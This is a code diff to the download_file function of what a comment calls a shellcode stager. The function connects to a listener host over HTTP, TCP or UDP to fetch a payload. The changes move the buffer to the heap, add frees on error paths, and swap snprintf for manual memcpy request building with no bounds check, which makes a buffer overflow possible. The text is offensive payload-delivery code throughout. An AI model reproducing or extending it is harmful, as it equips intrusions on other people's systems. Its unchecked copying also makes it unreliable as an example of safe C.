@@ -211,7 +211,10 @@ size_t download_file(const char *host, const char *port, const char *path,
   (void)key; // Suppress unused warning if UDP is disabled
   int sockfd;
   struct sockaddr_in serv_addr;
-  char temp_buffer[BUFFER_SIZE];
+  char *temp_buffer = malloc(BUFFER_SIZE);
+  if (!temp_buffer) {
+    return 0;
+  }
   size_t data_size = 0;
 
   // Prepare the address info
@@ -230,6 +233,7 @@ size_t download_file(const char *host, const char *port, const char *path,
   // Parse IP
   if (inet_aton(host, &serv_addr.sin_addr) == 0) {
     // Failed to parse IP. DNS resolution not implemented in shellcode stager.
+    free(temp_buffer);
     return 0;
   }
 
@@ -241,6 +245,7 @@ size_t download_file(const char *host, const char *port, const char *path,
 #endif
 
   if (sockfd == -1) {
+    free(temp_buffer);
     return 0;
   }
 
@@ -248,6 +253,7 @@ size_t download_file(const char *host, const char *port, const char *path,
   // Connect to the server (TCP only)
   if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == -1) {
     close(sockfd);
+    free(temp_buffer);
     return 0;
   }
 #endif
@@ -255,19 +261,46 @@ size_t download_file(const char *host, const char *port, const char *path,
 #ifdef LISTENER_HTTP
   // HTTP protocol - send GET request
   char request[BUFFER_SIZE];
-  snprintf(request, sizeof(request),
-           "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path,
-           host);
+  char *ptr = request;
+
+  // "GET "
+  memcpy(ptr, "GET ", 4);
+  ptr += 4;
+
+  // path
+  size_t len = strlen(path);
+  memcpy(ptr, path, len);
+  ptr += len;
+
+  // " HTTP/1.1\r\nHost: "
+  const char *mid = " HTTP/1.1\r\nHost: ";
+  size_t mid_len = 17; // strlen(mid)
+  memcpy(ptr, mid, mid_len);
+  ptr += mid_len;
+
+  // host
+  len = strlen(host);
+  memcpy(ptr, host, len);
+  ptr += len;
+
+  // "\r\nConnection: close\r\n\r\n"
+  const char *end = "\r\nConnection: close\r\n\r\n";
+  size_t end_len = 23; // strlen(end)
+  memcpy(ptr, end, end_len);
+  ptr += end_len;
+
+  *ptr = '\0';
 
   if (send(sockfd, request, strlen(request), 0) == -1) {
     close(sockfd);
+    free(temp_buffer);
     return 0;
   }
 
   // Read the response and skip HTTP headers
   int header_end = 0;
   while (1) {
-    long bytes_received = recv(sockfd, temp_buffer, sizeof(temp_buffer) - 1, 0);
+    long bytes_received = recv(sockfd, temp_buffer, BUFFER_SIZE - 1, 0);
     if (bytes_received <= 0) {
       break;
     }
@@ -299,7 +332,7 @@ size_t download_file(const char *host, const char *port, const char *path,
 #elif defined(LISTENER_TCP)
   // Raw TCP - read data directly
   while (1) {
-    long bytes_received = recv(sockfd, temp_buffer, sizeof(temp_buffer), 0);
+    long bytes_received = recv(sockfd, temp_buffer, BUFFER_SIZE, 0);
     if (bytes_received <= 0) {
       break;
     }
@@ -341,11 +374,12 @@ size_t download_file(const char *host, const char *port, const char *path,
       if (sendto(sockfd, hello_packet, 5, 0, (struct sockaddr *)&serv_addr,
                  sizeof(serv_addr)) == -1) {
         close(sockfd);
+        free(temp_buffer);
         return 0;
       }
     }
 
-    long bytes_received = recvfrom(sockfd, temp_buffer, sizeof(temp_buffer), 0,
+    long bytes_received = recvfrom(sockfd, temp_buffer, BUFFER_SIZE, 0,
                                    (struct sockaddr *)&src_addr, &src_len);
 
     if (bytes_received <= 0) {
@@ -387,5 +421,6 @@ size_t download_file(const char *host, const char *port, const char *path,
 #endif
 
   close(sockfd);
+  free(temp_buffer);
   return data_size;
 }
